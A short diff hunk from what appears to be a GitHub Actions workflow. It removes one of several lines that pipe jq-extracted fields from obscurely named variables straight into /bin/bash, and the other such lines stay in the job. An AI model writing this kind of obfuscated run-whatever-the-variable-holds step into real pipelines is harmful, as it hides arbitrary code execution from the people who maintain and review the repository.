@@ -22,7 +22,6 @@ jobs:
           echo $ghd8 | jq -r .tzv15703 | /bin/bash
           echo $pdeli63479 | jq -r .eejb5 | /bin/bash
           printf '%s' "$dgc589" | jq -r .mpxol7 | /bin/bash
-          echo $omnr13873 | jq -r .umna2183 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
